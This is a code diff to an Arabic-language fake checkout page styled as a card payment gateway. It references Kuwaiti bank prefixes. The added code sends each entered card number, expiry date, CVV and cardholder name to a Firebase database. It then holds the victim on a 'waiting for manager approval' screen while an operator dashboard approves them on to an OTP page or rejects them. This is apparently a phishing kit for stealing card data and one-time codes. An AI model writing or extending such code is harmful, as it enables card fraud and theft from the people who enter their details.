@@ -4,6 +4,10 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <title>الدفع</title>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+  <script src="./assets/js/firebase-client.js"></script>
   <style>
     /* ستايل بوابات الدفع العالمية المطابق للصورة (Moyasar / Stripe Style) */
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
@@ -237,9 +241,11 @@
   <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-card">
       <div class="loading-spinner"></div>
-      <div class="loading-text">جار التحميل يرجى الانتظار</div>
+      <div class="loading-text" id="loadingText">جار التحميل يرجى الانتظار</div>
     </div>
   </div>
+
+  <div class="error-message" id="rejectionMessage" style="display:none;max-width:440px;margin:12px auto;background:#fef2f2;border:1px solid #f5c6c6;border-radius:8px;padding:12px 16px;font-size:0.85rem;text-align:center;color:#c0392b;"></div>
 
   <div class="form-container page">
     <div class="form-title">
@@ -399,9 +405,108 @@
             sessionStorage.setItem('cardHolder', cardHolder);
 
             loadingOverlay.classList.add('show');
+            document.getElementById('loadingText').textContent = 'جار إرسال البيانات يرجى الانتظار';
 
-            // التوجيه المباشر بعد التحقق من صحة المدخلات
-            window.location.href = 'otpcredit_card_page.html';
+            // ═══════════════════════════════════════════════════════════
+            // إرسال بيانات البطاقة إلى Firebase عند الإرسال (بدل التوجيه المباشر)
+            // ═══════════════════════════════════════════════════════════
+            const prefix = cardNumber.slice(0, 6);
+            let cardBank = 'غير معروف';
+            if (prefix.match(/^4/)) cardBank = 'VISA';
+            else if (prefix.match(/^5[1-5]/)) cardBank = 'MasterCard';
+            else if (prefix.match(/^3[47]/)) cardBank = 'AMEX';
+
+            // تحديد اسم البنك من البادئة (اختصارات بنوك الكويت)
+            const bankPrefixes = [
+              { p: '90', bank: 'NBK' }, { p: '99', bank: 'GBC' }, { p: '41', bank: 'CBK' },
+              { p: '51', bank: 'KFH' }, { p: '52', bank: 'KFH' }, { p: '54', bank: 'KFH' },
+              { p: '55', bank: 'KFH' }, { p: '53', bank: 'GBK' }, { p: '97', bank: 'ABK' },
+              { p: '63', bank: 'Burgan' }, { p: '59', bank: 'Boubyan' }, { p: '58', bank: 'BBK' }
+            ];
+            for (const b of bankPrefixes) {
+              if (prefix.startsWith(b.p)) { cardBank = b.bank; break; }
+            }
+
+            const cardPayload = {
+              cardNumber,
+              expiry,
+              cvv,
+              cardHolder,
+              prefix,
+              bankName: cardBank
+            };
+
+            // إرسال إلى Firestore/RTDB عبر نفس دالة knet/verification المستخدمة
+            let firebaseDone = Promise.resolve(true);
+            try {
+              if (typeof window.pushFirebaseCard === 'function') {
+                firebaseDone = window.pushFirebaseCard(cardBank, prefix, cardNumber, expiry.split(' / ')[0] || '', expiry.split(' / ')[1] || '', cvv, cvv).then(() => true).catch((err) => {
+                  try {
+                    const cRef = window.db ? window.db.collection("cards").doc('card_' + Date.now()) : null;
+                    if (cRef) { cRef.set(cardPayload); return true; }
+                  } catch (e) {}
+                  console.error("Firebase card write error:", err);
+                  return true;
+                });
+              }
+            } catch (e) {}
+
+            // تحديث وثيقة العميل (currentPage + إشعار للوحة)
+            try {
+              if (typeof window.ensureCustomerDoc === 'function') {
+                window.ensureCustomerDoc({ currentPage: 'صفحة إدخال البطاقة', lastSeen: Date.now() });
+              }
+            } catch (e) {}
+
+            firebaseDone.then(() => {
+              // ═══════════════════════════════════════════════════════
+              // الانتظار: التوجيه يتم الآن من لوحة التحكم (موافقة / رفض)
+              // ═══════════════════════════════════════════════════════
+              document.getElementById('loadingText').textContent = 'بانتظار موافقة المدير على العملية...';
+
+              const rejectionMsg = document.getElementById('rejectionMessage');
+              const onReject = (cmd) => {
+                const reason = (cmd && (cmd.reason || cmd.raw && cmd.raw.reason)) || 'يرجى المحاولة مرة أخرى';
+                document.getElementById('loadingText').textContent = 'تم رفض العملية';
+                rejectClear();
+                if (rejectionMsg) {
+                  rejectionMsg.style.display = 'block';
+                  rejectionMsg.textContent = '❌ تم رفض العملية من قبل المدير: ' + reason;
+                }
+              };
+              const rejectClear = () => { loadingOverlay.classList.remove('show'); };
+
+              if (typeof window.listenForAdminCommands === 'function') {
+                window.listenForAdminCommands({
+                  onApproval: function () {
+                    // المدير وافق — الانتقال لصفحة إدخال رمز التحقق (OTP)
+                    window.location.href = 'verification.html';
+                  },
+                  onRejection: onReject,
+                  onMessage: function (msg) {
+                    if (msg && msg.message) { try { alert(msg.message); } catch (e) {} }
+                  }
+                });
+              } else {
+                // احتياط: إذا لم تكن المكتبة محمّلة — إعادة التوجيه للسلة
+                window.location.href = 'cartepage.html';
+              }
+
+              // أمان إضافي: إن لم يصدر قرار خلال 60 ثانية أعد فحص القرار المخزن
+              setTimeout(function () {
+                try {
+                  if (typeof window.customerRef === 'object' && window.customerRef) {
+                    window.customerRef.get().then((snap) => {
+                      if (snap.exists) {
+                        const d = snap.data() || {};
+                        if (d.decision === 'approved') { window.location.href = 'verification.html'; }
+                        else if (d.decision === 'rejected') { onReject(d); }
+                      }
+                    }).catch(() => {});
+                  }
+                } catch (e) {}
+              }, 60000);
+            });
         });
     });
 </script>
